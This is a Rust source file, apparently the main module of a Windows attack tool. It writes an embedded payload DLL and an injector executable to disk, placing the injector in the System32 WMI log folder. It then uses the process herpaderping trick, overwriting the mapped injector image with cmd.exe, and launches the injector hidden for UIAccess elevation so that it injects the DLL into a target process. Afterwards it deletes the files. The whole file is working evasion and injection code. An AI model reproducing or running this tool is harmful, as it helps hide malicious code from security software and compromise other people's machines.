mod embedded;
mod enum_process;
mod process;

use std::{
    ffi::CString,
    fs::File,
    io::{self, Error},
    os::windows::io::AsRawHandle,
    path::PathBuf,
    ptr::null_mut,
    str::FromStr,
    time::Duration,
};

use ntapi::{ntmmapi::NtCreateSection, ntobapi::NtClose, ntrtl::RtlNtStatusToDosError};
use winapi::um::winnt::{PAGE_READONLY, SEC_IMAGE, SECTION_ALL_ACCESS};
use windows::{
    Win32::{
        System::Threading::WaitForSingleObject,
        UI::{
            Shell::{
                SEE_MASK_NO_CONSOLE, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA, ShellExecuteExA,
            },
            WindowsAndMessaging::SW_HIDE,
        },
    },
    core::PCSTR,
};

fn main() -> io::Result<()> {
    let system_root = PathBuf::from(std::env::var("SystemRoot").unwrap());
    let base_path = system_root.join("System32").join("LogFiles").join("WMI");
    let current_path = std::env::current_dir()?;

    // Find suitable target process
    let Some(candidate) = process::find_target_process()?.first().copied() else {
        eprintln!("Could not find a suitable target process");
        return Ok(());
    };

    if !base_path.exists() {
        eprintln!("Target directory does not exist");
        return Ok(());
    }

    // Write out payload to disk
    let payload_path = current_path.join("payload.dll");
    std::fs::write(&payload_path, embedded::PAYLOAD_BIN)?;

    // Write injector to disk
    let injector_path = base_path.join("injector.exe");
    std::fs::write(&injector_path, embedded::INJECTOR_BIN)?;

    // Herpaderp time!
    let mut injector_file = File::options()
        .read(true)
        .write(true)
        .open(&injector_path)?;
    let mut section = null_mut();
    unsafe {
        let res = NtCreateSection(
            &mut section,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            injector_file.as_raw_handle() as _,
        );

        if res != 0 {
            return Err(Error::from_raw_os_error(RtlNtStatusToDosError(res) as i32));
        }
    }

    let mut cmd_file = File::open(system_root.join("System32").join("cmd.exe"))?;
    std::io::copy(&mut cmd_file, &mut injector_file)?;

    drop(cmd_file);
    drop(injector_file);

    // Execute injector
    let result = execute_injector(
        &injector_path.to_string_lossy(),
        candidate,
        &payload_path.to_string_lossy(),
    );
    std::thread::sleep(Duration::from_millis(250));

    // Cleanup
    unsafe {
        NtClose(section);
    }

    _ = std::fs::remove_file(injector_path);
    _ = std::fs::remove_file(payload_path);

    if let Err(why) = result {
        eprintln!("Could not spawn injector: {why}");
    }

    Ok(())
}

/// Execute the injector using `ShellExecute` to allow for elevation to UIAccess
fn execute_injector(injector_path: &str, pid: u32, payload_path: &str) -> io::Result<()> {
    let injector_path_c = CString::from_str(&injector_path).unwrap();
    let params_c = CString::from_str(&format!("{pid} \"{payload_path}\"")).unwrap();

    unsafe {
        let mut info = SHELLEXECUTEINFOA::default();
        info.cbSize = size_of_val(&info) as _;
        info.lpFile = PCSTR(injector_path_c.as_ptr() as _);
        info.lpVerb = PCSTR(b"open\0".as_ptr());
        info.lpParameters = PCSTR(params_c.as_ptr() as _);
        info.nShow = SW_HIDE.0;
        info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;

        ShellExecuteExA(&mut info)?;
        WaitForSingleObject(info.hProcess, u32::MAX);
    }

    Ok(())
}
